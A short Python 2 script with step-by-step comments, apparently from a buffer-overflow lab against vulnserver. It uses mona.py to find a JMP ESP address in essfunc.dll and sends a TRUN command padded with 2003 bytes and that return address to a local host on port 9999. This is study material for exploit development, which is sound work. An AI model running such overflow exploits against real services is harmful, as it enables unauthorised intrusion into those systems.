#!/usr/bin/python
import sys, socket

# in ID we used mona.py to find a vulnerable module by entering !mona modules and looked for a module without protections
# In this case the module with lot of falses when it came to protections was essfucnc.dll
# we then used nasm in kali to find the hex code for JMP ESP FFE4, which when written in hex looks like \xFF\xE4
# we then used mona.py in ID to run the following !mona find -s "\xff\xe4" -m essfunc.dll
# -m = module which is the module found in line 4 that was attached to vulnserver that had no protections = essfunc.dll
# -s "\xff\xe4" is the adress FFE4 written as hex code (FFE4 generated by nasm for the JMP ESP)
# When you run line 6 it provides a list of return addresses, start at the top of that list
# After our As we are going to enter the addresses returned in the previous line in reverse in hex format e.g. 625011af = \xaf\x11\x50\x62

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.143',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close

except:
    print "Error connecting to server"
    sys.exit()
